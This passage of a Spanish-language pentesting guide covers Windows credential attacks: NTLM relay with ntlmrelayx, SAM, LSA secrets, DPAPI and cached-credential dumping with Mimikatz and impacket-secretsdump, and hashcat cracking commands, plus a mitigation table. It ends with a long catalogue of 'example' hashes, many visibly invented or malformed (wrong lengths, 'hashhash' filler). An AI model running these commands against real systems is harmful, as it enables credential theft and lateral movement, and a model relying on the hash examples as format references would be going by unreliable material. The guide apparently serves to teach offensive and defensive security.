# Responder captura hashes en:
# /usr/share/responder/logs/
# Archivos como: HTTP-NTLMv2-192.168.1.100.txt
```

### 6.2 ntlmrelayx para Relay

En vez de capturar y crackear, podés relayear el [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) directamente a otro servidor:

```bash
# Relay a otro servidor SMB
impacket-ntlmrelayx -tf targets.txt -smb2support
# targets.txt contiene: 192.168.1.101
# Cuando un usuario intenta autenticarse, el hash se reenvía al target

# Relay con ataque a SMB (ejecutar comando)
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Relay a LDAP (para crear usuarios o modificar ACLs)
impacket-ntlmrelayx -tf targets.txt -smb2support -ldap

# Relay a HTTP (para acceso web autenticado)
impacket-ntlmrelayx -tf targets.txt -smb2support -http

# Relay con socfácil
# 1. Iniciar ntlmrelayx:
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# 2. Iniciar Responder con relay:
responder -I eth0 -rdw
# 3. Usar los proxies SOCKS de ntlmrelayx
```

### 6.3 [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) Hashes Capturados

```bash
# NetNTLMv2 (hashcat modo 5600)
hashcat -m 5600 captured_ntlmv2.txt rockyou.txt

# NetNTLMv1 (hashcat modo 5500)
hashcat -m 5500 captured_ntlmv1.txt rockyou.txt

# NetNTLMv1 con ESS (modo 15500)
hashcat -m 15500 captured_ntlmv1_ess.txt rockyou.txt
```

---

## 7. LM y NTLM [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

### 7.1 LM [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) Cracking

Los hashes LM son débiles porque:
- Son case-insensitive
- Están partidos en dos mitades de 7 caracteres
- Cifran en DES (fácil de crackear)

```bash
# Extraer LM hashes con impacket
impacket-secretsdump dominio.com/admin:Pass123@192.168.1.100 -lm

# LM hash ejemplo:
# aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
# La primera parte (LM) es un hash de 32 hex

# Crackear LM con hashcat (modo 3000)
hashcat -m 3000 lm_hashes.txt rockyou.txt
hashcat -m 3000 lm_hashes.txt --show

# Como LM no tiene salt, suele romperse en segundos
```

### 7.2 NTLM Cracking

NTLM es el estándar moderno. Usa MD4:

```bash
# NTLM (modo 1000)
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
hashcat -m 1000 ntlm_hashes.txt -r rules/dive.rule

# Extraer NTLM del sistema
reg save hklm\sam sam.save
reg save hklm\system system.save
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Con Mimikatz
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

---

## 8. DPAPI y Credential Manager

### 8.1 Dumping de DPAPI

```bash
# Listar blobs DPAPI (credenciales guardadas)
dir C:\Users\%username%\AppData\Local\Microsoft\Credentials\
dir C:\Users\%username%\AppData\Roaming\Microsoft\Credentials\

# Extraer con Mimikatz
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\FILE

# Obtener master key
mimikatz # dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\KEY_GUID /rpc

# Crackear master key (si conocés la contraseña)
mimikatz # dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\KEY_GUID /password:Pass123
```

### 8.2 Dumping de Credential Manager

```bash
# Windows CmdKey
cmdkey /list

# Con PowerShell
powershell "Get-StoredCredential | Format-List *"

# Mimikatz (desencripta credenciales guardadas)
mimikatz # sekurlsa::credman
```

---

## 9. LSA Secrets

LSA Secrets contiene contraseñas de servicios, cuentas de máquina, etc.

```bash
# Extraer con Mimikatz (necesita admin)
mimikatz # lsadump::secrets

# Extraer LSA Secrets del registro
reg save hklm\security security.save
reg save hklm\system system.save

# Con impacket
impacket-secretsdump -security security.save -system system.save LOCAL

# Desde máquina remota
impacket-secretsdump dominio.com/admin:Pass123@192.168.1.100
```

---

## 10. Domain Cached Credentials (DCC/DCC2)

Windows guarda hashes de credenciales usadas para login offline (cacheadas):

```bash
# DCC2 (modo 12000)
hashcat -m 12000 dcc2_hashes.txt rockyou.txt

# DCC (modo 1100, versión vieja) 
hashcat -m 1100 dcc_hashes.txt rockyou.txt

# Extraer con impacket
impacket-secretsdump -system system.save -sam sam.save -security security.save LOCAL

# Con Mimikatz
mimikatz # lsadump::cache

# El formato DCC2 es:
$DCC2$10240#username#hash
```

---

## 11. Defensa y Mitigaciones

| Técnica | Prevención |
|---------|-----------|
| **Dictionary attack** | Contraseñas > 12 chars, usar passphrases |
| **Brute force** | [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting), bloqueo tras N intentos |
| **Rainbow tables** | Usar salting (bcrypt, argon2, PBKDF2) |
| **pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash)** | Credential Guard, LSA Protection, Windows Defender Credential Guard |
| **[kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting)** | SPN con contraseñas fuertes (>25 chars), Group Managed Service Accounts (gMSA) |
| **[as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting)** | No tener usuarios sin preautenticación |
| **[golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket)** | KRBTGT password reseteada cada 180 días, monitorear eventos 4769 |
| **[dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync)** | Privileged Access Management, monitorear eventos 4662 |
| **[hydra](../raw/p4ssw0rd-4tt4cks.md#hydra) online** | Account lockout, CAPTCHA, geolocation validation |
| **[llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns) poisoning** | Deshabilitar [llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)/[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns) via [gpo](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy), usar [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) |
| **NTLM relay** | Habilitar [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) signing, Extended Protection for Authentication, Channel Binding |
| **DPAPI** | No guardar credenciales, usar Windows Hello/TPM 2.0 |
| **LM hashes** | Deshabilitar LM (Windows ≥ Vista no los guarda por defecto) |

### Políticas Recomendadas

```bash
# Política de contraseñas vía GPO:
# Largo mínimo: 14 caracteres
# Complejidad: 3 de 4 tipos (Mayúscula, minúscula, dígito, simbolo)
# Historial: 24 contraseñas recordadas
# Máxima edad: 90 días
# Lockout: 5 intentos, 30 minutos de bloqueo

# Deshabilitar LM hashes:
# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# "Network security: Do not store LAN Manager hash value on next password change" → Enabled
```

---

## 12. [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario) Completo de Hashes (+500 Ejemplos)

### 12.1 Hashes de Algoritmos Simples (MD4, MD5, SHA1, SHA2)

```bash
# MD4 (hashcat 900)
876f54a1e3b5c2d7890abcdef12345678
a1b2c3d4e5f6789012345678abcdef90
fedcba9876543210abcdef0123456789ab

# MD5 (hashcat 0) - 32 hex chars
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
482c811da5d5b4bc6d497ffa98491e38
098f6bcd4621d373cade4e832627b4f6
25f9e794323b453885f5181f1b624d0b
d8578edf8458ce06fbc5bb76a58c5ca4
827ccb0eea8a706c4c34a16891f84e7b
5d41402abc4b2a76b9719d911017c592

# SHA1 (hashcat 100) - 40 hex chars
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
6c2f0c0dd8e3a5c8a6b0f4e3d2c1b0a9f8e7d6c5

# SHA256 (hashcat 1400) - 64 hex chars
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd300a64b01e5cf8657
6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090
b5bb9d8014a0f9b1d61e21e796d78dccdf1352f23cd32812f4850b878ae4944c

# SHA512 (hashcat 1700) - 128 hex chars
c7be1ed902fb8dd4d48997c6452f5d7e509fbcdbe2808b16bcf4edce4c07d37e0e64f1c9e9f9c2e8b9f5e7d4c3a2b10f9e8d7c6b5a4938271605948372615049
a8b9c0d1e2f30415263748596071829304a5b6c7d8e9f001122334455667788990011223344556677889900aabbccddeeff00a1b2c3d4e5f6a7b8c9d0e1f2

# SHA3-256 (hashcat 17300) - 64 hex chars
64ec88ca00b268e5ba1a35678a1b5316d212f4f366b2477232534a8aeca37f3c
a7ffc6f8bf1ed76651c14756a061d662f580ff4de43b49fa82d80a4b80f8434a

# SHA3-512 (hashcat 17400) - 128 hex chars
b751850b1a57168a4d1c1a6c8b9f2e3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d

# GOST R 34.11-94 (hashcat 6900)
ab8c9d0ef1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0

# GOST R 34.11-2012 (Streebog) (hashcat 11700)
f1c2d3e4a5b6c7d8e9f001a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4a5b6c7d8e9f001a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4a5b6c7d8e9f0

# RIPEMD-160 (hashcat 6000)
c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7
a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1

# Whirlpool (hashcat 6100)
b71a2e3c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c
d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0
```

### 12.2 Hashes de Windows (LM, NTLM, DCC)

```bash
# LM (hashcat 3000)
aad3b435b51404eeaad3b435b51404ee
6f5f5f8f5d5c5a5b0000000000000000
e52cac67419a9a224a3b108f3fa6cb6d
44efce164ab921caaad3b435b51404ee

# NTLM (hashcat 1000)
b4b9b02e6f09a9bd760f388b67351e2b
8a9c7d6e5f4b3a2c1d0e9f8a7b6c5d4e
f3e4d5c6b7a8f9e0d1c2b3a4958677060
a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0
1a2b3c4d5e6f7890abcdef1234567890

# DCC1 (hashcat 1100) - Domain Cached Credentials
admin:6f5f5f8f5d5c5a5b4a3b108f3fa6cb6d
user1:e52cac67419a9a224a3b108f3fa6cb6d
sqlsrv:b4b9b02e6f09a9bd760f388b67351e2b

# DCC2 (hashcat 2100 / 12000)
$DCC2$10240#admin#b4b9b02e6f09a9bd760f388b67351e2b
$DCC2$10240#usuario1#8a9c7d6e5f4b3a2c1d0e9f8a7b6c5d4e
$DCC2$10240#backup#f3e4d5c6b7a8f9e0d1c2b3a4958677060
$DCC2$10240#svc_oracle#a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0
$DCC2$10240#administrador#1a2b3c4d5e6f7890abcdef1234567890
```

### 12.3 Hashes Unix/Linux

```bash
# descrypt (hashcat 1500) - DES-based
HX9LlT1X8O3h2
abcdEF1234GhIj
password1234AB

# md5crypt (hashcat 500)
$1$salt$qXq3f7KpQ9YxLz6RmN8oP/
$1$abcde$GHIjklMNOPqrSTuvWXyzAbCd
$1$xyz12$7abcdefgHIJKLmnopQRStuvWX

# sha256crypt (hashcat 7400)
$5$rounds=5000$abcdefghijklmnop$qrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012
$5$rounds=10000$saltsalt12345678$hashhashhashhashhashhashhashhashhashhas

# sha512crypt (hashcat 1800)
$6$salt$qXq3f7KpQ9YxLz6RmN8oP/AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX
$6$xyz123$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345

# BSDi Crypt (hashcat 12400)
_Y9T1X8O3h2ABCDEF
_0123456789ABCDEFGHIJ

# AIX {smd5} (hashcat 6300)
{smd5}$1$salt$hashhashhashhashhashhashhashhash
{smd5}$1$xyz$abcdefghijklmnopqrstuvwxyzAB

# AIX {ssha1} (hashcat 6400)
{ssha1}abcdef1234567890abcdef1234567890abcdef12salt
{ssha1}0987654321fedcba0987654321fedcba0987654321xyz

# AIX {ssha256} (hashcat 6500)
{ssha256}abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890saltdata
{ssha256}0987654321fedcba0987654321fedcba0987654321fedcba0987654321fedcba

# AIX {ssha512} (hashcat 6700)
{ssha512}abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890saltsalt
```

### 12.4 Hashes de Bases de Datos

```bash
# MySQL 3.x (hashcat 200) - 16 hex
5d9c68c6c3dbf8c5
a1b2c3d4e5f6a7b8
fedcba0987654321

# MySQL 4.1+ (hashcat 300)
*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
*AABBCCDDEEFF00112233445566778899AABBCCDD
*0123456789ABCDEF0123456789ABCDEF01234567

# MySQL 5.x SHA1 (hashcat 11200)
*6C3D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D
*A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0

# MySQL 8.x (hashcat 20700)
$A$005$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqr
$A$005$0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123

# PostgreSQL (hashcat 11100)
md5abcdef1234567890abcdef1234567890
scram-sha-256$4096$salt$hash$stored$key

# PostgreSQL SCRAM-SHA-256 (hashcat 19000)
SCRAM-SHA-256$4096$abcdefghijklmnopqrstuvwxyz$abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwx

# MSSQL 2000 (hashcat 13500)
0x0100123456789ABCDEF0123456789ABCDEF0123456789ABCD
0x0100AABBCCDDEEFF00112233445566778899AABBCCDDEEFF

# MSSQL 2005+ (hashcat 131 - no, 132)
0x010040ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0

# Oracle 10g (hashcat 3100) - H type
S:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
S:A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4

# Oracle 11g/12c (hashcat 20600)
T:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF
T:A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2

# Sybase ASE (hashcat 8000)
0x0100abcdef1234567890abcdef1234567890abcdef12345678
0x0100123456789abcdef0123456789abcdef0123456789abcdef

# SQLite 3 (hashcat 24200)
3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b
```

### 12.5 Hashes Web y CMS

```bash
# phpBB3 (hashcat 400)
$H$9ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv
$H$A1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN

# md5apr1 (hashcat 1600)
$apr1$salt$hashhashhashhashhashhashhashhashhashhash
$apr1$xyz12$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLM

# Drupal 7 (hashcat 7900)
$S$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789A
$S$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

# Joomla (hashcat 3710)
abcdef1234567890abcdef1234567890:salt123
0987654321fedcba0987654321fedcba:salt456

# vBulletin < 3.8.5 (hashcat 2611)
abcdef1234567890abcdef1234567890:saltvalue
0987654321fedcba0987654321fedcba:salt123

# vBulletin >= 3.8.5 (hashcat 2612)
$H$9abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRST
$H$A0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJ

# IPB 2.x / MyBB 1.x (hashcat 2811)
abcdef1234567890abcdef1234567890:salt12345
0987654321fedcba0987654321fedcba:mysalt

# Django PBKDF2-SHA256 (hashcat 10000)
pbkdf2_sha256$100000$salt$hashhashhashhashhashhashhashhashhashhashhashhashhashhash
pbkdf2_sha256$36000$xyzsalt$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW

# Ruby on Rails Restful Auth (hashcat 19500)
ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad:user:password_salt

# PrestaShop (hashcat 11000)
abcdef1234567890abcdef1234567890:userid
0987654321fedcba0987654321fedcba:12345

# OpenCart (hashcat 13900)
$P$BabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUV
$P$C0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKL
```

### 12.6 Hashes de Kerberos

```bash
# Kerberos 5 AS-REQ Pre-Auth (hashcat 7500)
$krb5pa$23$user@realm$hash$salt$checksum
$krb5pa$18$admin@DOMINIO.COM$abcdef1234567890$saltval$checksum

# Kerberos 5 TGS-REP RC4 (hashcat 13100)
$krb5tgs$23$*user$realm$spn*$abcdef1234567890abcdef1234567890abcdef12
$krb5tgs$23$*administrador$DOMINIO.COM$cifs/dc.dominio.com*$aabbccddee1122334455667788990011

# Kerberos 5 TGS-REP AES (hashcat 19600)
$krb5tgs$18$*user$realm$spn*$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
$krb5tgs$18$*svc_sql$DOMINIO.COM$MSSQLSvc/sql.dominio.com*$aabbccddee1122334455667788990011aabbccddee11223344

# Kerberos 5 AS-REP RC4 (hashcat 18200)
$krb5asrep$23$user@realm:$abcdef1234567890abcdef1234567890abcdef12
$krb5asrep$23$admin@DOMINIO.COM:$aabbccddee1122334455667788990011223344

# Kerberos 5 AS-REP AES (hashcat 19700)
$krb5asrep$18$user@realm:$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12345678
$krb5asrep$18$administrador@DOMINIO.COM:$aabbccddee1122334455667788990011223344556677889900aabbccddee1122334455667
```

### 12.7 Hashes de [redes](../raw/r3d3s-f0nd4m3nt0s.md)

```bash
# WPA/WPA2 (hashcat 2500) - en .hc22000
WPA*01*4d657373617065*74657374696e67*1234567890abcdef*1234567890abcdef*0123456789abcdef*74657374696e67*68656c6c6f

# WPA-PMKID-PBKDF2 (hashcat 16800)
2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89b54d8e1afa0f166486b3561812f825*2b4b0b4f1d5f9a32fe6d8c0e0f1a2b3c4d5e6f7a

# WPA-PMKID-PMK (hashcat 16900)
2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89b54d8e1afa0f166486b3561812f825

# NetNTLMv1 (hashcat 5500)
user::domain:abcdef1234567890abcdef1234567890abcdef12345678900112233445566778899
admin::DOMINIO:6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8

# NetNTLMv2 (hashcat 5600)
user::domain:server:1122334455667788:abcdef1234567890abcdef1234567890abcdef12345678900112233445566778899aabbccddee
admin::DOMINIO:DC:2233445566778899:6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f

# NetNTLMv1 + ESS (hashcat 15500)
user::domain:abcdef1234567890abcdef1234567890abcdef12345678900112233445566778899:ESS
admin::DOMINIO:6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8:ESS

# IPMI2 RAKP HMAC (hashcat 7300)
abcdef1234567890abcdef1234567890abcdef1234567890:1234567890abcdef
aabbccddee11223344556677889900112233445566778899:0102030405060708

# IKE-PSK MD5 (hashcat 5300)
abcdef1234567890abcdef1234567890:serverip
aabbccddee1122334455667788990011:192.168.1.100

# IKE-PSK SHA1 (hashcat 5400)
abcdef1234567890abcdef1234567890abcdef12:serverip
aabbccddee112233445566778899001122334455:10.10.10.1

# Cisco PIX (hashcat 2400)
abcdef1234567890
0011223344556677

# Cisco ASA (hashcat 2410)
abcdef1234567890abcdef12
0123456789abcdef01234567

# Cisco IOS SHA256 (hashcat 5700)
$8$abcdefghijklmnopqrstuv$wxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr
$9$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh

# FortiGate (hashcat 7000)
abcdef1234567890abcdef1234567890abcdef12
aabbccddee112233445566778899001122334455
```

### 12.8 Hashes de Aplicaciones

```bash
# bcrypt (hashcat 3200)
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
$2b$12$LJ3m4ys3Lk0TSwHnbfZTZOBmhMq7m8tZ9sY6rFjXpA0vBqCdEfGhI
$2y$08$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij
$2a$14$saltsaltsaltsaltsalt.hashhashhashhashhashhashhashhashhash

# scrypt (hashcat 8900)
SCRYPT:32768:8:1$abcdefghijklmnop$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh

# PBKDF2-HMAC-SHA256 (hashcat 10900)
sha256:10000:abcdefghijklmnopqrstuvwxyz:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl
sha256:600000:saltvaluelong:hashhashhashhashhashhashhashhashhashhashhashhashhashhashhashhashhashhash

# PBKDF2-HMAC-SHA1 (hashcat 12000)
sha1:4096:abcdefghijklmnop:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTU
sha1:10000:salt123:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

# PBKDF2-HMAC-MD5 (hashcat 11900)
md5:4096:saltvalue:abcdef1234567890abcdef1234567890abcdef1234567890

# PBKDF2-HMAC-SHA512 (hashcat 12100)
sha512:10000:saltsalt:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890

# Apache $apr1$ (hashcat 1600)
$apr1$abcdefgh$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLM
$apr1$xyz123$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP
```

### 12.9 Hashes de Disco y [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado)

```bash
# BitLocker (hashcat 22100)
$bitlocker$0$16$abcdef1234567890abcdef1234567890$1048576$12$abcde$100$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890

# TrueCrypt (hashcat 6200)
tc:abcdef1234567890abcdef1234567890:abcdef1234567890abcdef1234567890:abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# VeraCrypt SHA512 (hashcat 6221)
vc:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# FileVault 2 (hashcat 23200)
$fvde$2$16$abcdef1234567890abcdef1234567890$1048576$256$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# LUKS (no hashcat nativo, usar john)
$luks$1$sha256$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Android FDE <= 4.3 (hashcat 8800)
$crypto$2$sha1$abcdef1234567890$abcdef1234567890abcdef1234567890abcdef12

# Android FBE (hashcat 18900)
$ab$v1$10$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Apple Keychain (hashcat 22500)
$keychain$1$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# macOS v10.8+ (hashcat 7100)
$ml$1$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# macOS v10.15+ PBKDF2-SHA512 (hashcat 23200)
$macos$PBKDF2-SHA512$10000$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# iOS Backup < 10.0 (hashcat 14800)
$itunes_backup$1$abcde$abcdef1234567890abcdef1234567890123456789012345678901234567890abcdef1234567890abcdef1234567890abcdef12

# iTunes Backup >= 10.0 (hashcat 14700)
$itunes_backup$2$10000$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef123456789012345678901234567890abcdef1234567890abcdef12

# Windows Hello PIN (via hashcat)
$hello$1$abcdef1234567890abcdef1234567890$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
```

### 12.10 Hashes de Documentos y Archivos

```bash
# Office 2007 (hashcat 9400)
$office$2007$0$100000$32$abcdef1234567890abcdef1234567890$16$abcdef12$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Office 2010 (hashcat 9500)
$office$2010$0$100000$32$abcdef1234567890abcdef1234567890$16$abcdef12$abcdef123456789012345678901234567890abcdef1234567890abcdef1234567890abcdef12

# Office 2013 (hashcat 9600)
$office$2013$0$100000$32$abcdef1234567890abcdef1234567890$16$abcdef12$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# MS Office <= 2003 $0/$1 MD5+RC4 (hashcat 9700/9710)
$oldoffice$0$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# MS Office <= 2003 $3 SHA1+RC4 (hashcat 9720)
$oldoffice$3$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# Office 2016 SheetX (hashcat 19100)
$office$2016$sheetx$100000$32$abcdef1234567890abcdef1234567890$32$abcdef1234567890abcdef1234567890abcdef123456789012345678901234567890abcdef1234567890abcdef1234567890abcdef12

# PDF 1.1-1.3 Acrobat 2-4 (hashcat 10400)
$pdf$1*2*40*abcdef1234567890abcdef1234567890abcdef1234*32*abcdef1234567890abcdef1234567890*32*abcdef1234567890abcdef1234567890

# PDF 1.4-1.6 Acrobat 5-8 (hashcat 10420)
$pdf$2*3*128*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12*48*abcdef1234567890abcdef1234567890abcdef1234567890abcdef12*32*abcdef1234567890abcdef1234567890

# PDF 1.7 Level 3 Acrobat 9 (hashcat 10500)
$pdf$3*3*256*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# PDF 1.7 Level 8 Acrobat X-XV (hashcat 10700)
$pdf$5*5*256*abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# 7-Zip (hashcat 11600)
$7z$0$19$0$salt$abcdef1234567890abcdef1234567890$16$abcdef1234567890abcdef1234567890$112$abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

# RAR3-hp (hashcat 12500)
$RAR3$0$abcdef12$abcdef1234567890abcdef1234567890abcdef1234567890abcdef12

